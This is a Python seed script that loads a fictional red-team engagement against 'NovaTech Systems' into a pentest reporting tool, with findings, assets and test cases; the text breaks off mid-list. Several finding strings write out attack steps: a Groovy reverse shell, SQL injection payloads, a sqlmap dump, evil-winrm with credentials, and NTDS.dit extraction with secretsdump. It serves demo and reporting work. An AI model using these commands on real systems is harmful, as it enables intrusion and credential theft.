"""
Redwire Demo Seed Script
=========================
Creates a rich, realistic Red Team engagement to showcase all of Redwire's
core features: findings with CVSS scores, assets with port data, test cases,
cleanup artifacts, engagement phases, and notes.

Run with:
    docker exec redwire-backend python seed_demo.py

Idempotent: Skips creation if an engagement with the same name already exists.
"""
import asyncio
from datetime import datetime, timedelta
from sqlalchemy import select
from database import AsyncSessionLocal
from models.user import User
from models.engagement import Engagement, EngagementStatus
from models.finding import Finding, Severity, FindingStatus
from models.asset import Asset
from models.asset_port import AssetPort, PortProtocol, PortState
from models.testcase import TestCase
from models.cleanup_artifact import CleanupArtifact, CleanupArtifactStatus
from models.engagement_phase import EngagementPhase
from models.note import Note
from models.associations import FindingAsset


# ──────────────────────────────────────────────────────────────────
# Engagement metadata
# ──────────────────────────────────────────────────────────────────

ENGAGEMENT_NAME = "NovaTech Systems – External Red Team Assessment"

ENGAGEMENT = {
    "name":            ENGAGEMENT_NAME,
    "client_name":     "NovaTech Systems",
    "engagement_type": "Red Team",
    "status":          EngagementStatus.REPORTING,
    "description": (
        "Full-scope adversary simulation engagement against NovaTech Systems' "
        "internet-facing infrastructure and corporate network. The Red Team "
        "operated under a 30-day continuous assessment window with objectives "
        "to simulate a sophisticated, nation-state-level threat actor targeting "
        "intellectual property and customer data."
    ),
    "scope": (
        "In scope:\n"
        "• All hosts within AS64512 (NovaTech ASN)\n"
        "• *.novatech.io and *.novatech.com\n"
        "• VPN gateway: vpn.novatech.io\n"
        "• Public-facing API platform: api.novatech.io\n"
        "• Corporate SSO portal: sso.novatech.io\n"
        "• CI/CD pipeline: jenkins.novatech.io\n\n"
        "Out of scope:\n"
        "• Third-party SaaS integrations\n"
        "• Physical security tests\n"
        "• Social engineering campaigns (covered in Phase 2)"
    ),
    "objectives": (
        "1. Establish initial foothold via external attack surface.\n"
        "2. Achieve domain compromise or equivalent data exfiltration.\n"
        "3. Demonstrate lateral movement from DMZ to core infrastructure.\n"
        "4. Identify weaknesses in detection and incident response capabilities.\n"
        "5. Provide a prioritised remediation roadmap for the security team."
    ),
    "start_date": datetime.utcnow() - timedelta(days=35),
    "end_date":   datetime.utcnow() - timedelta(days=5),
}

# ──────────────────────────────────────────────────────────────────
# Phases
# ──────────────────────────────────────────────────────────────────

PHASES = [
    {
        "phase_name":    "SCOPING",
        "sort_order":    0,
        "planned_start": datetime.utcnow() - timedelta(days=42),
        "planned_end":   datetime.utcnow() - timedelta(days=36),
    },
    {
        "phase_name":    "PLANNING",
        "sort_order":    1,
        "planned_start": datetime.utcnow() - timedelta(days=36),
        "planned_end":   datetime.utcnow() - timedelta(days=35),
    },
    {
        "phase_name":    "IN_PROGRESS",
        "sort_order":    2,
        "planned_start": datetime.utcnow() - timedelta(days=35),
        "planned_end":   datetime.utcnow() - timedelta(days=6),
    },
    {
        "phase_name":    "REPORTING",
        "sort_order":    3,
        "planned_start": datetime.utcnow() - timedelta(days=6),
        "planned_end":   datetime.utcnow() + timedelta(days=2),
    },
]

# ──────────────────────────────────────────────────────────────────
# Assets
# ──────────────────────────────────────────────────────────────────

ASSETS = [
    {
        "name":        "api.novatech.io",
        "asset_type":  "Domain",
        "identifier":  "api.novatech.io",
        "description": "Public REST API gateway — primary attack surface entry point.",
        "notes":       "Running on nginx/1.18.0. AWS us-east-1. Resolves to 54.204.31.7.",
        "is_pwned":    True,
        "is_scanned":  True,
        "in_scope":    True,
        "ports": [
            (443, "TCP", "https",  "OPEN", "nginx 1.18.0"),
            (80,  "TCP", "http",   "OPEN", "nginx 1.18.0 (redirects to 443)"),
            (8443,"TCP", "https-alt","OPEN","Swagger UI — unauthenticated"),
        ],
    },
    {
        "name":        "sso.novatech.io",
        "asset_type":  "Domain",
        "identifier":  "sso.novatech.io",
        "description": "Corporate Single Sign-On portal (Okta-branded, custom backend).",
        "notes":       "Okta SAML endpoint exposed. Password spray successful — 3 accounts.",
        "is_pwned":    True,
        "is_scanned":  True,
        "in_scope":    True,
        "ports": [
            (443, "TCP", "https", "OPEN", "Apache httpd 2.4.51"),
            (80,  "TCP", "http",  "OPEN", "Apache httpd 2.4.51"),
        ],
    },
    {
        "name":        "jenkins.novatech.io",
        "asset_type":  "Domain",
        "identifier":  "jenkins.novatech.io",
        "description": "CI/CD pipeline host — Jenkins 2.320 (LTS). Exposed externally.",
        "notes":       "Unauthenticated script console accessible. RCE achieved via Groovy.",
        "is_pwned":    True,
        "is_scanned":  True,
        "in_scope":    True,
        "ports": [
            (8080, "TCP", "http",  "OPEN", "Jetty 9.4.43.v20210629"),
            (22,   "TCP", "ssh",   "OPEN", "OpenSSH 8.2p1"),
            (443,  "TCP", "https", "OPEN", "Jetty 9.4.43.v20210629"),
        ],
    },
    {
        "name":        "vpn.novatech.io",
        "asset_type":  "Domain",
        "identifier":  "vpn.novatech.io",
        "description": "Corporate VPN gateway — Cisco ASA / AnyConnect.",
        "notes":       "CVE-2021-1609 present. Firmware not patched since 2021.",
        "is_pwned":    False,
        "is_scanned":  True,
        "in_scope":    True,
        "ports": [
            (443,  "TCP", "ssl-vpn", "OPEN", "Cisco ASA 9.14"),
            (4444, "UDP", "cisco-anyconnect", "OPEN", ""),
        ],
    },
    {
        "name":        "10.10.0.5",
        "asset_type":  "IP Address",
        "identifier":  "10.10.0.5",
        "description": "Internal Active Directory Domain Controller — dc01.corp.novatech.local.",
        "notes":       "Reached after lateral movement from jenkins host. NTDS.dit dumped.",
        "is_pwned":    True,
        "is_scanned":  True,
        "in_scope":    True,
        "ports": [
            (53,   "TCP", "dns",   "OPEN", ""),
            (88,   "TCP", "kerberos","OPEN",""),
            (389,  "TCP", "ldap",  "OPEN", ""),
            (445,  "TCP", "smb",   "OPEN", "Windows Server 2019"),
            (636,  "TCP", "ldaps", "OPEN", ""),
            (3389, "TCP", "rdp",   "OPEN", ""),
        ],
    },
    {
        "name":        "10.10.0.20",
        "asset_type":  "IP Address",
        "identifier":  "10.10.0.20",
        "description": "Internal file server — fs01.corp.novatech.local.",
        "notes":       "SMB shares enumerated. 3 shares accessible to Domain Users including sensitive R&D docs.",
        "is_pwned":    False,
        "is_scanned":  True,
        "in_scope":    True,
        "ports": [
            (445, "TCP", "smb", "OPEN", "Windows Server 2016"),
            (135, "TCP", "msrpc","OPEN",""),
        ],
    },
    {
        "name":        "s3://novatech-backups",
        "asset_type":  "Cloud Resource",
        "identifier":  "s3://novatech-backups",
        "description": "AWS S3 bucket exposed due to misconfigured bucket policy.",
        "notes":       "Public LIST and GET — contains database backups and SSH keys.",
        "is_pwned":    True,
        "is_scanned":  True,
        "in_scope":    True,
        "ports":       [],
    },
]

# ──────────────────────────────────────────────────────────────────
# Findings
# ──────────────────────────────────────────────────────────────────

FINDINGS = [
    {
        "title":    "Remote Code Execution via Jenkins Script Console",
        "severity": Severity.CRITICAL,
        "status":   FindingStatus.OPEN,
        "cvss_score": 10.0,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "category": "Remote Code Execution",
        "asset_idx": [2],  # jenkins
        "description": (
            "The Jenkins CI/CD server at jenkins.novatech.io exposes an unauthenticated Groovy Script Console "
            "at /script. This interface allows arbitrary Java/Groovy code execution on the underlying host "
            "operating system with the privileges of the jenkins service account."
        ),
        "impact": (
            "Full compromise of the CI/CD pipeline enables an attacker to:\n"
            "• Inject malicious code into all software builds and deployments\n"
            "• Extract all stored credentials, secrets, and API keys from build configurations\n"
            "• Use the server as a pivot point into the internal corporate network\n"
            "• Achieve supply-chain compromise affecting all downstream NovaTech customers"
        ),
        "steps_to_reproduce": (
            "1. Navigate to http://jenkins.novatech.io:8080/script\n"
            "2. The Groovy Script Console loads without any authentication prompt\n"
            "3. Enter the following payload in the console:\n"
            "   println 'id'.execute().text\n"
            "4. Click 'Run' — response contains: uid=1001(jenkins) gid=1001(jenkins)\n"
            "5. Achieved interactive reverse shell using:\n"
            "   String host='10.10.99.1'; int port=4444; "
            "   String cmd='bash -i'; Process p=new ProcessBuilder(cmd.split(' ')).redirectErrorStream(true).start()"
        ),
        "mitigations": (
            "1. IMMEDIATE: Restrict network access to /script and /scriptText to authorised IP ranges only.\n"
            "2. Enable Jenkins' built-in authentication and enforce role-based access control (Role Strategy Plugin).\n"
            "3. Ensure Jenkins is not directly internet-accessible — place behind a VPN or bastion host.\n"
            "4. Upgrade Jenkins to the latest LTS release.\n"
            "5. Rotate all credentials stored in Jenkins build configurations."
        ),
        "references": "CVE-2023-27898, CVE-2023-27905 | https://www.jenkins.io/security/advisory/2023-03-08/",
    },
    {
        "title":    "S3 Bucket Public READ Access — Database Backups & SSH Keys Exposed",
        "severity": Severity.CRITICAL,
        "status":   FindingStatus.OPEN,
        "cvss_score": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "category": "Cloud Misconfiguration",
        "asset_idx": [6],  # s3 bucket
        "description": (
            "The AWS S3 bucket s3://novatech-backups has a bucket policy granting s3:ListBucket and s3:GetObject "
            "to the wildcard principal (*). This allows any unauthenticated internet user to enumerate and download "
            "all objects within the bucket."
        ),
        "impact": (
            "The bucket was found to contain:\n"
            "• Full PostgreSQL database dumps (customer PII, payment card data)\n"
            "• Private SSH key pairs for production EC2 instances\n"
            "• Terraform state files containing AWS access keys\n"
            "• Internal API credentials and service account tokens"
        ),
        "steps_to_reproduce": (
            "1. aws s3 ls s3://novatech-backups --no-sign-request\n"
            "2. Review the directory listing — 47 objects totalling 12.4 GB\n"
            "3. aws s3 cp s3://novatech-backups/db/prod_2024-01-15.sql.gz . --no-sign-request\n"
            "4. Decompress and inspect — full production database dump confirmed\n"
            "5. aws s3 cp s3://novatech-backups/keys/ec2_prod.pem . --no-sign-request\n"
            "6. Confirmed private key authenticates to 3 production EC2 instances"
        ),
        "mitigations": (
            "1. IMMEDIATE: Remove the wildcard (*) principal from the bucket policy.\n"
            "2. Enable S3 Block Public Access at both the bucket and account level.\n"
            "3. Rotate all SSH keys, API credentials, and tokens found in the bucket.\n"
            "4. Notify affected customers per GDPR/PCI-DSS breach notification requirements.\n"
            "5. Enable S3 Server Access Logging and AWS CloudTrail for ongoing monitoring.\n"
            "6. Review all other S3 buckets for similar misconfigurations using AWS Trusted Advisor."
        ),
        "references": "CWE-284: Improper Access Control | AWS S3 Block Public Access documentation",
    },
    {
        "title":    "Password Spray Attack — 3 Active Directory Accounts Compromised",
        "severity": Severity.CRITICAL,
        "status":   FindingStatus.IN_REVIEW,
        "cvss_score": 9.1,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "category": "Authentication",
        "asset_idx": [1],  # sso
        "description": (
            "The corporate SSO portal at sso.novatech.io does not implement account lockout or rate limiting "
            "on authentication attempts. By spraying a single common password across all discovered user accounts, "
            "the Red Team successfully authenticated as three employees within a 4-hour window — all without "
            "triggering any security alerts."
        ),
        "impact": (
            "The three compromised accounts include:\n"
            "• j.martinez@novatech.io — Sales Engineer (access to Salesforce CRM, customer contracts)\n"
            "• a.johnson@novatech.io — DevOps Engineer (access to AWS console, Kubernetes, GitHub)\n"
            "• m.chen@novatech.io — Finance Analyst (access to NetSuite, payroll system)\n\n"
            "The DevOps account was subsequently used to escalate privileges to Domain Administrator."
        ),
        "steps_to_reproduce": (
            "1. Harvested 847 employee email addresses via LinkedIn OSINT and email format discovery\n"
            "2. Filtered to 312 accounts confirmed as valid via SSO login page enumeration\n"
            "3. Ran password spray with the password 'NovaTech2024!' — derived from company name and year\n"
            "   Tool: spray.py against https://sso.novatech.io/api/v1/authn\n"
            "4. After 4 hours and 312 authentication attempts: 3 successful logins\n"
            "5. No account lockouts triggered. No alerts generated in SIEM."
        ),
        "mitigations": (
            "1. Enforce MFA on all SSO accounts immediately — prioritise privileged accounts.\n"
            "2. Implement account lockout after 5 failed attempts within a 15-minute window.\n"
            "3. Deploy Conditional Access policies restricting logins to known corporate IP ranges.\n"
            "4. Force password reset for all 312 enumerated accounts.\n"
            "5. Implement a SIEM rule to alert on >10 failed logins from a single IP within 5 minutes.\n"
            "6. Conduct mandatory security awareness training focused on password hygiene."
        ),
        "references": "MITRE ATT&CK T1110.003 – Password Spraying",
    },
    {
        "title":    "SQL Injection in API Search Endpoint — Full Database Read",
        "severity": Severity.HIGH,
        "status":   FindingStatus.OPEN,
        "cvss_score": 8.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "category": "Injection",
        "asset_idx": [0],  # api
        "description": (
            "The API endpoint GET /api/v2/products/search?q= is vulnerable to error-based SQL injection. "
            "The 'q' parameter is directly concatenated into a raw SQL query without parameterisation. "
            "Testing revealed the backend is PostgreSQL 14 running as a privileged database user."
        ),
        "impact": (
            "• Complete read access to all 23 database tables including customers, orders, and payment_methods\n"
            "• Enumeration of 142,000 customer records including email addresses, addresses, and purchase history\n"
            "• Potential for data destruction by chaining with write permissions (unconfirmed)\n"
            "• Compliance violation: PCI-DSS requirement 6.3.1 (injection vulnerability remediation)"
        ),
        "steps_to_reproduce": (
            "1. Send: GET /api/v2/products/search?q=test' AND 1=CAST((SELECT version()) AS INT)--\n"
            "2. Response includes PostgreSQL version in error: 'invalid input syntax for type integer: "
            "\"PostgreSQL 14.5 on x86_64-pc-linux-gnu\"'\n"
            "3. Enumerate tables: GET /api/v2/products/search?q=test' UNION SELECT table_name,2 "
            "FROM information_schema.tables WHERE table_schema='public'--\n"
            "4. Dump customers table: sqlmap -u 'https://api.novatech.io/api/v2/products/search?q=test' "
            "--dbms=postgresql --dump -T customers"
        ),
        "mitigations": (
            "1. Replace all raw SQL string concatenation with parameterised queries or ORM query builders.\n"
            "2. Apply the principle of least privilege — the API database user should not have DBA privileges.\n"
            "3. Implement a Web Application Firewall (WAF) with SQL injection detection rules.\n"
            "4. Conduct a full audit of all API endpoints for similar injection vulnerabilities.\n"
            "5. Notify affected customers under applicable breach notification laws."
        ),
        "references": "CWE-89 | OWASP A03:2021 Injection | CVE pattern: none (custom code)",
    },
    {
        "title":    "Unauthenticated Swagger UI Exposes Internal API Schema",
        "severity": Severity.HIGH,
        "status":   FindingStatus.OPEN,
        "cvss_score": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "category": "Information Disclosure",
        "asset_idx": [0],  # api
        "description": (
            "Port 8443 on api.novatech.io hosts an unauthenticated Swagger UI instance at "
            "https://api.novatech.io:8443/swagger. This interface exposes the complete OpenAPI schema "
            "for all internal API endpoints, including undocumented administrative endpoints and their "
            "expected request/response formats. "
            "The administrative endpoints are accessible without authentication from this interface."
        ),
        "impact": (
            "• Attacker reconnaissance is significantly reduced — full API attack surface is immediately visible\n"
            "• Administrative endpoints (e.g., POST /admin/users, DELETE /admin/engagement/{id}) were discovered\n"
            "• API keys and authentication tokens are hinted at in example requests\n"
            "• Internal endpoint naming conventions aid in further targeted attacks"
        ),
        "steps_to_reproduce": (
            "1. Navigate to https://api.novatech.io:8443/swagger in a browser — no authentication required\n"
            "2. The full OpenAPI 3.0 spec is rendered, listing 94 API endpoints\n"
            "3. Identify: GET /admin/users, POST /admin/users, DELETE /admin/users/{id}\n"
            "4. Test: GET /admin/users — returns HTTP 200 with a list of all 312 user accounts\n"
            "   (Authentication enforcement is absent on this port entirely)"
        ),
        "mitigations": (
            "1. Immediately restrict port 8443 — it should not be reachable from the internet.\n"
            "2. Disable Swagger UI in all production environments or restrict behind authentication.\n"
            "3. Ensure all administrative API endpoints require appropriate authentication and authorisation.\n"
            "4. Use API gateway firewall rules to block unauthenticated access to /admin/* paths."
        ),
        "references": "OWASP API Security Top 10: API3:2023 Broken Object Property Level Authorization",
    },
    {
        "title":    "Cisco ASA — Unauthenticated RCE (CVE-2021-1609) — VPN Gateway",
        "severity": Severity.HIGH,
        "status":   FindingStatus.OPEN,
        "cvss_score": 8.6,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H",
        "category": "Known CVE",
        "asset_idx": [3],  # vpn
        "description": (
            "The VPN gateway vpn.novatech.io is running Cisco ASA 9.14 which is affected by CVE-2021-1609, "
            "a critical vulnerability in the web services interface of Cisco ASA Software. "
            "An unauthenticated remote attacker can exploit this vulnerability to cause a denial of service "
            "or potentially execute arbitrary code by sending crafted HTTP requests."
        ),
        "impact": (
            "• Disruption of the corporate VPN would prevent remote employees from accessing internal systems\n"
            "• Potential RCE allows an attacker to intercept VPN traffic and credentials in transit\n"
            "• May allow an attacker to bypass network segmentation controls"
        ),
        "steps_to_reproduce": (
            "Version confirmed via banner grab:\n"
            "   curl -k -I https://vpn.novatech.io\n"
            "   Server: Cisco ASA 9.14(2)\n\n"
            "PoC reference: https://github.com/orangecertcc/cisco-asa-cve-2021-1609\n"
            "(Exploitation not performed to avoid disruption; version confirmation sufficient)"
        ),
        "mitigations": (
            "1. Apply the Cisco security advisory patch for CVE-2021-1609 immediately.\n"
            "2. Establish a patch management programme to ensure firewall firmware is updated quarterly.\n"
            "3. Restrict management access to the ASA to authorised admin IP addresses only.\n"
            "4. Monitor CVSS feeds and vendor advisories for future ASA vulnerabilities."
        ),
        "references": "CVE-2021-1609 | https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-webvpn-dos-raanPAVe",
    },
    {
        "title":    "NTDS.dit Domain Hash Dump — Complete Active Directory Compromise",
        "severity": Severity.CRITICAL,
        "status":   FindingStatus.OPEN,
        "cvss_score": 10.0,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
        "category": "Active Directory",
        "asset_idx": [4],  # dc01
        "description": (
            "Following lateral movement from the compromised Jenkins server to the internal network, "
            "the Red Team escalated privileges to Domain Administrator using compromised DevOps credentials. "
            "The NTDS.dit Active Directory database was subsequently exfiltrated using the VSS (Volume Shadow Copy) "
            "technique, yielding NTLM hashes for all 847 domain accounts."
        ),
        "impact": (
            "• All 847 Active Directory account hashes extracted — full domain compromise\n"
            "• Domain Administrator (DA) hash cracked offline in 47 minutes using Hashcat\n"
            "• Golden ticket attack is now possible — persistent, undetectable access achievable\n"
            "• All forest trust relationships are transitively compromised\n"
            "• KRBTGT password should be reset twice to invalidate all Kerberos tickets"
        ),
        "steps_to_reproduce": (
            "1. Obtained initial foothold on jenkins host via Script Console RCE\n"
            "2. Discovered plaintext credentials in Jenkins build config: a.johnson@novatech.io / DevOps2024!\n"
            "3. Authenticated to DC via WinRM from Jenkins host:\n"
            "   evil-winrm -i 10.10.0.5 -u a.johnson -p 'DevOps2024!'\n"
            "4. Checked privileges: whoami /priv — confirmed SeBackupPrivilege\n"
            "5. Created VSS snapshot and extracted NTDS.dit + SYSTEM hive:\n"
            "   diskshadow /s extract.dsh\n"
            "   robocopy /b \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS ntds ntds.dit\n"
            "6. Transferred files to attacker C2 and extracted hashes:\n"
            "   impacket-secretsdump -ntds ntds.dit -system SYSTEM local"
        ),
        "mitigations": (
            "1. IMMEDIATE: Reset the KRBTGT account password twice (48 hours apart) to invalidate golden tickets.\n"
            "2. Force password resets for all 847 domain accounts.\n"
            "3. Implement tiered administration model — separate DA credentials from standard user accounts.\n"
            "4. Deploy Windows Credential Guard to prevent credential harvesting attacks.\n"
            "5. Enable Privileged Access Workstations (PAWs) for all Domain Administrator tasks.\n"
            "6. Audit and restrict SeBackupPrivilege — only granted to explicitly approved backup accounts.\n"
            "7. Deploy Microsoft Defender for Identity (MDI) to detect Kerberoasting and DCSync attacks."
        ),
        "references": "MITRE ATT&CK T1003.003 – NTDS | T1558.001 – Golden Ticket",
    },
    {
        "title":    "Missing HTTP Security Headers — All Public Endpoints",
        "severity": Severity.LOW,
        "status":   FindingStatus.OPEN,
        "cvss_score": 3.1,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
        "category": "Security Hardening",
        "asset_idx": [0, 1],
        "description": (
            "All internet-facing web applications are missing several key HTTP security response headers. "
            "Specifically absent are: Content-Security-Policy (CSP), X-Frame-Options, "
            "Strict-Transport-Security (HSTS) with preload, and Permissions-Policy."
        ),
        "impact": (
            "• Increased susceptibility to clickjacking attacks (missing X-Frame-Options)\n"
            "• Browser-side XSS attacks not mitigated (missing CSP)\n"
            "• HTTPS downgrade attacks possible on clients not yet using preloaded HSTS"
        ),
        "steps_to_reproduce": (
            "curl -I https://api.novatech.io\n"
            "Observed response headers — none of the following present:\n"
            "  Content-Security-Policy\n"
            "  X-Frame-Options\n"
            "  Strict-Transport-Security\n"
            "  Permissions-Policy\n"
            "Verified with securityheaders.com — grade: F"
        ),
        "mitigations": (
            "1. Add the following headers to all nginx/Apache virtual host configurations:\n"
            "   add_header X-Frame-Options 'DENY' always;\n"
            "   add_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload' always;\n"
            "   add_header Content-Security-Policy \"default-src 'self'\" always;\n"
            "   add_header Permissions-Policy 'geolocation=(), microphone=()' always;\n"
            "2. Test with securityheaders.com after deployment — target grade A+.\n"
            "3. Submit novatech.io to the HSTS preload list once HSTS is stable."
        ),
        "references": "OWASP Secure Headers Project | https://securityheaders.com",
    },
    {
        "title":    "TLS 1.0 and TLS 1.1 Supported on Multiple Endpoints",
        "severity": Severity.LOW,
        "status":   FindingStatus.OPEN,
        "cvss_score": 3.7,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "category": "Cryptography",
        "asset_idx": [0, 3],
        "description": (
            "TLS 1.0 and TLS 1.1 are deprecated protocols that are accepted by api.novatech.io and "
            "vpn.novatech.io. Both protocols contain known weaknesses including POODLE, BEAST, and ROBOT "
            "that can facilitate man-in-the-middle attacks against clients that negotiate these older protocol versions."
        ),
        "impact": (
            "• Clients using older browsers or misconfigured TLS stacks may negotiate vulnerable protocol versions\n"
            "• PCI-DSS 4.0 explicitly requires TLS 1.2 as the minimum — this is a compliance violation"
        ),
        "steps_to_reproduce": (
            "testssl.sh https://api.novatech.io\n"
            "→  TLSv1   offered\n"
            "→  TLSv1.1 offered\n"
            "→  TLSv1.2 offered\n"
            "→  TLSv1.3 offered"
        ),
        "mitigations": (
            "1. In nginx: ssl_protocols TLSv1.2 TLSv1.3;\n"
            "2. In Cisco ASA: ssl server-version tlsv1.2\n"
            "3. Validate with testssl.sh after change — confirm TLS 1.0/1.1 no longer offered."
        ),
        "references": "PCI-DSS v4.0 requirement 4.2.1 | NIST SP 800-52 Rev 2",
    },
    {
        "title":    "SMB null sessions enabled — Internal File Server",
        "severity": Severity.MEDIUM,
        "status":   FindingStatus.OPEN,
        "cvss_score": 6.5,
        "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "category": "Network Security",
        "asset_idx": [5],  # fs01
        "description": (
            "The internal file server 10.10.0.20 (fs01) allows null session SMB connections, "
            "enabling unauthenticated enumeration of network shares, user accounts, and group memberships. "
            "Three shares were accessible to Domain Users without additional restrictions, including "
            "a 'Research_Dev' share containing unencrypted R&D documentation."
        ),
        "impact": (
            "• Any authenticated domain user can access sensitive R&D documentation\n"
            "• Null sessions allow unauthenticated enumeration of users, groups, and shares\n"
            "• R&D documents include product roadmaps, source code snapshots, and customer NDA materials"
        ),
        "steps_to_reproduce": (
            "smbclient -L 10.10.0.20 -N\n"
            "→ Sharename: ADMIN$  IPC$  C$  Finance  Research_Dev  HR_Archive\n\n"
            "net use \\\\10.10.0.20\\Research_Dev '' /user:''\n"
            "→ Connected — 847 files listed including 'NovaTech_Product_Roadmap_2025.xlsx'"
        ),
        "mitigations": (
            "1. Disable null sessions: HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA\\RestrictAnonymous = 2\n"
            "2. Apply share permissions restricting Research_Dev to the 'Engineering' security group only.\n"
            "3. Enable SMB signing to prevent relay attacks.\n"
            "4. Remove legacy SMB 1.0 support from all Windows hosts."
        ),
        "references": "CWE-284 | MS-KB article 246261",
    },
]

# ──────────────────────────────────────────────────────────────────
# Test Cases
# ──────────────────────────────────────────────────────────────────

TESTCASES = [
    # Reconnaissance
    {
        "category":    "RECONNAISSANCE",
        "title":       "External Attack Surface Enumeration",
        "description": "Enumerate all internet-facing assets using passive and active OSINT techniques.",
        "steps":       "1. Passive DNS enumeration via Shodan, Censys, SecurityTrails\n2. Certificate transparency log review\n3. ASN lookup and IP range identification\n4. Web crawling and Wayback Machine review",
        "expected":    "Complete map of external attack surface with open ports and service banners.",
        "actual":      "Identified 14 internet-facing hosts across 2 IP ranges. 3 unknown hosts discovered not in client-provided scope sheet.",
        "executed":    True,
        "successful":  True,
        "notes":       "Discovered jenkins.novatech.io which was not in clients original scope list — confirmed in-scope post-discovery.",
    },
    {
        "category":    "RECONNAISSANCE",
        "title":       "Employee OSINT & Credential Exposure Check",
        "description": "Harvest employee email addresses and check for credential exposure in breach databases.",
        "steps":       "1. LinkedIn scraping for employee email format\n2. Hunter.io enumeration\n3. HaveIBeenPwned and DeHashed lookups\n4. GitHub/GitLab employee account review for secret exposure",
        "expected":    "List of employee accounts with confirmed exposure in breach databases.",
        "actual":      "847 employee emails enumerated. 23 accounts found in breach databases. 3 accounts had matching passwords still valid.",
        "executed":    True,
        "successful":  True,
        "notes":       "GitHub OSINT found an internal Jenkins API token committed to a public employee repository.",
    },
    # Exploitation
    {
        "category":    "EXPLOITATION",
        "title":       "Authentication Bypass Testing — SSO Portal",
        "description": "Test SSO portal for authentication bypass, brute force protections, and MFA gaps.",
        "steps":       "1. Test for username enumeration via timing differences\n2. Password spray with top-100 common passwords\n3. Test MFA bypass via SIM swap and TOTP manipulation\n4. Review OAuth/SAML implementation for token forgery",
        "expected":    "SSO portal enforces rate limiting, account lockout, and MFA on all accounts.",
        "actual":      "No rate limiting or lockout present. Password spray: 3/312 accounts compromised. MFA not enforced on any account.",
        "executed":    True,
        "successful":  True,
        "notes":       "Password 'NovaTech2024!' was successful for all 3 accounts — likely set by IT helpdesk as a default.",
    },
    {
        "category":    "EXPLOITATION",
        "title":       "SQL Injection — API Endpoint Fuzzing",
        "description": "Test all API endpoints for SQL injection using automated and manual techniques.",
        "steps":       "1. Spider API surface using OpenAPI schema from Swagger UI\n2. Fuzz all string parameters with SQLMap\n3. Manual testing of complex query parameters\n4. Test for blind/time-based SQLi where error-based fails",
        "expected":    "All API parameters properly sanitised — no SQL injection present.",
        "actual":      "Error-based SQLi confirmed on /api/v2/products/search?q= endpoint. Full DB read achieved.",
        "executed":    True,
        "successful":  True,
        "notes":       "Used Swagger UI to enumerate all 94 API endpoints first. Only 1 required authentication.",
    },
    {
        "category":    "EXPLOITATION",
        "title":       "Known CVE Testing — Jenkins, Cisco ASA, Apache",
        "description": "Test all identified service versions against known public CVEs.",
        "steps":       "1. Map service versions from reconnaissance\n2. Cross-reference against NVD/CVE database\n3. Attempt verified PoC exploits against in-scope targets\n4. Document result per CVE",
        "expected":    "All services patched to versions without critical/high CVEs.",
        "actual":      "Jenkins Script Console unauthenticated (no specific CVE — misconfiguration). Cisco ASA 9.14 — CVE-2021-1609 confirmed present (not exploited, denial of service risk).",
        "executed":    True,
        "successful":  True,
        "notes":       "Cisco ASA exploit not executed to avoid VPN disruption during business hours. Confirmed via version fingerprint only.",
    },
    # Post Exploitation
    {
        "category":    "POST_EXPLOITATION",
        "title":       "Lateral Movement — Jenkins to Internal Network",
        "description": "Use compromised Jenkins server as a pivot point to reach internal corporate systems.",
        "steps":       "1. Enumerate internal network from Jenkins host\n2. Extract credentials from Jenkins configuration files\n3. Attempt WinRM, SSH, and SMB authentication to internal hosts\n4. Pivot via SOCKS5 proxy",
        "expected":    "Network segmentation prevents Jenkins from reaching internal AD infrastructure.",
        "actual":      "Jenkins host had unrestricted access to all internal /16 subnets. No firewall between DMZ and internal LAN. WinRM successful to DC using DevOps credentials.",
        "executed":    True,
        "successful":  True,
        "notes":       "DevOps credentials were in plaintext in /var/jenkins_home/jobs/deploy-prod/builds/1/log",
    },
    {
        "category":    "POST_EXPLOITATION",
        "title":       "Privilege Escalation — Domain Admin via SeBackupPrivilege",
        "description": "Attempt privilege escalation from standard domain user to Domain Administrator.",
        "steps":       "1. Enumerate token privileges with whoami /priv\n2. Test SeBackupPrivilege abuse for NTDS.dit extraction\n3. Try Kerberoasting and AS-REP Roasting\n4. Test for GPO misconfiguration and ACL abuse",
        "expected":    "Least privilege enforced — DevOps account should not have DA-equivalent capabilities.",
        "actual":      "a.johnson account had SeBackupPrivilege — used to extract NTDS.dit. Full domain hash dump achieved.",
        "executed":    True,
        "successful":  True,
        "notes":       "SeBackupPrivilege appears to have been granted for a backup solution that was decommissioned 18 months ago. Privilege not revoked.",
    },
    {
        "category":    "POST_EXPLOITATION",
        "title":       "Detection Evasion — EDR Bypass Testing",
        "description": "Test whether offensive tooling triggers EDR/AV detections.",
        "steps":       "1. Run Mimikatz in-memory — observe SIEM/EDR alerts\n2. Run BloodHound collection — observe network monitoring alerts\n3. Use hollowed process for reverse shell — observe process creation alerts\n4. Review SOC response time if any alert fires",
        "expected":    "All offensive tools should trigger EDR/SIEM alerts within 15 minutes.",
        "actual":      "Zero alerts generated across the entire 30-day engagement. SOC had no visibility of any Red Team activity.",
        "executed":    True,
        "successful":  True,
        "notes":       "Defender for Endpoint was deployed on workstations but not servers. Server coverage gap is significant.",
    },
    # Reporting
    {
        "category":    "REPORTING",
        "title":       "Attack Path Chain Documentation",
        "description": "Document the complete kill chain from initial access to domain compromise.",
